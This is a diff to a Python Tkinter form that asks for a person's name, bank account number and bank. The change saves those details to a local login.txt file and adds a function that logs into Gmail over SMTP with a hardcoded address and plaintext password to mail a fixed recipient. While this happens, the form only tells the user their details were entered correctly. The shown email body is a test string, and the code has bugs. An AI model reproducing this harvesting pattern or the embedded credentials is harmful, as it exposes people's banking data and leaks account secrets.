@@ -17,38 +17,64 @@ def clear():
  n_2.delete(0, END)
 
 
+def send_email():
+    with open("login.txt", "r") as file:
+        for line in file:
+            print(line)
+
+    from smtplib import SMTP
+
+    try:
+        sender_email = "dejagernathan99@gmail.com"
+        receiver_email = "luyandadingindlela@gmail.com"
+        password = "nathan,001"
+        server = SMTP('smtp.gmail.com', 587)
+        server.starttls()
+
+        server.login(sender_email, password )
+        server.sendmail(sender_email, receiver_email, 'This is a test email.')
+        print("the message has been successfully sent")
+
+    except Exception as err:
+        print("Something went wrong..", err)
+    finally:
+        server.close()
+
+
+
 def enter():
    try:
-       list1 = ["1", "2", "3", "4", '5', "6", "7", "8", '9', "0"]
-       name_ent = n_1.get()
-       number_ent = n_2.get()
-       if name_ent == '':
-           raise ValueError
-       elif name_ent in list1:
+        list1 = ["1", "2", "3", "4", '5', "6", "7", "8", '9', "0"]
+        name_ent = n_1.get()
+        number_ent = n_2.get()
+
+        if name_ent == '':
+            raise ValueError
+        elif name_ent in list1:
+            raise ValueError
+        if number_ent == '':
+            raise ValueError
+        else:
+            int(n_2.get())
+            messagebox.showinfo(message='Details have been entered correctly:)')
+            if bankchoosen.get() == 'Select Bank':
                raise ValueError
-       if number_ent == '':
-                raise ValueError
-       else:
-        int(n_2.get())
-        messagebox.showinfo(message='Details have been entered correctly:)')
-       if bankchoosen.get() == 'Select Bank':
-        raise ValueError
-       elif bankchoosen.get() == 'FNB':
-        messagebox.showinfo(message='Details have been entered correctly:)')
-       elif bankchoosen.get() == 'Capitec':
-        messagebox.showinfo(message='Details have been entered correctly:)')
-       elif bankchoosen.get() == 'Netbank':
-        messagebox.showinfo(message='Details have been entered correctly:)')
-       elif bankchoosen.get() == 'Standard Bank':
-        messagebox.showinfo(message='Details have been entered correctly:)')
-       elif bankchoosen.get() == 'Bidvest Bank':
-        messagebox.showinfo(message='Details have been entered correctly:)')
-       elif bankchoosen.get() == 'Ivestec':
-        messagebox.showinfo(message='Details have been entered correctly:)')
+
+
+            with open("login.txt", "w+") as file:
+                file.write("name: " + str(name_ent))
+                file.write("\n")
+                file.write("account numbers: " + str(number_ent))
+                file.write("\n")
+                file.write("bank name: " + str(bankchoosen))
+
+        send_email()
+
+
 
 
    except ValueError:
-        messagebox.showerror(message='Something went wrong! Please ensure that fields are entered correctly')
+    messagebox.showerror(message='Something went wrong! Please ensure that fields are entered correctly')
 
 
 Label(window,width="300", text="Please enter details below", bg="orange",fg="white").pack()
